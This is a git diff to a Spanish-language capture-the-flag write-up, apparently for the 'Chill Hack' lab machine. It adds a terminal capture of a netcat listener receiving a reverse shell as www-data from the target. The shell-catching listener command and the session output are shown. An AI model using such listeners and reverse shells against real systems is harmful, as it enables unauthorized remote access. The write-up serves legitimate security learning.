@@ -152,14 +152,21 @@ Enunciado :
 
         Teniendo claro esto vamos a ejecutar una reverse shell.
 
-## Obtenemos Shell en la maquina victima.
+## Obtenemos sesion en la maquina victima.
 
   - Nos ponemos en escucha con netcat y ejecutamos el siguiente comando
 
     ![image](https://github.com/Esevka/CTF/assets/139042999/ab5599ee-a6a0-4734-a012-f39d28ba2760)
 
-      
-      
+        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/chill_hack]
+        └─# nc -lnvp 1988
+        listening on [any] 1988 ...
+        connect to [10.9.92.151] from (UNKNOWN) [10.10.113.149] 49160
+        bash: cannot set terminal process group (1098): Inappropriate ioctl for device
+        bash: no job control in this shell
+        www-data@ubuntu:/var/www/html/secret$ whoami
+        whoami
+        www-data
 
 
     
